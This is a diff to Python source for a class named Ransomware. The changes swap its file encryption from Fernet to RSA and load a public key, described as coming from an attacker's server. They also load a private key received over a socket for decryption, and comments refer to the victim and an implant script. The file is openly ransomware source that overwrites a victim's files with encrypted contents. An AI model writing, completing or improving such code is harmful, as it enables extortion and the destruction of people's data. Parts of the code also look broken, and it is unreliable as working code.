@@ -9,6 +9,7 @@ import base64
 import logging
 import socket
 import math
+import rsa
 
 
 class Ransomware: 
@@ -128,7 +129,7 @@ class Ransomware:
         with open(file, "rb") as the_file:
             contents = the_file.read()
 
-        encrypted_contents = Fernet(key).encrypt(contents)
+        encrypted_contents = rsa.encrypt(contents, key)
         with open(file, "wb") as the_file:
             the_file.write(encrypted_contents)
         print("terminated")
@@ -164,7 +165,7 @@ class Ransomware:
         with open(file_path, "rb") as file:
             encrypted_contents = file.read()
 
-        decrypted_contents = Fernet(key).decrypt(encrypted_contents)
+        decrypted_contents = rsa.decrypt(encrypted_contents, key)
         with open(file_path, "wb") as the_file:
             the_file.write(decrypted_contents)
 
@@ -197,12 +198,9 @@ class Ransomware:
         """ Closing the file. """
         file.close()
 
-        #TODO: Replace this with Asymetric crypto
-        #Generate key and make a key file
-        #generate_key()
-        # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
-        with open("key.key", "rb") as key:
-            key = key.read()
+        #Read the public key from the server
+        with open("public_key.pem", "rb") as key_content:
+            key = rsa.PublicKey.load_pkcs1(key_content.read())
 
 
         #Encrypt all files
@@ -257,6 +255,11 @@ class Ransomware:
             print(f"[RECV] Receiving the private key data.")
             key.write(data)
             self._socket.sendall("File data received".encode("utf-8"))
+            
+            #Read the private key from the server
+            #I am not sure where to put this above, so I will leave it here for now
+            with open("private_key.pem", "rb") as key_content:
+                key = rsa.PrivateKey.load_pkcs1(key_content.read())
         
             # decrypt_all_files(home, key)
         
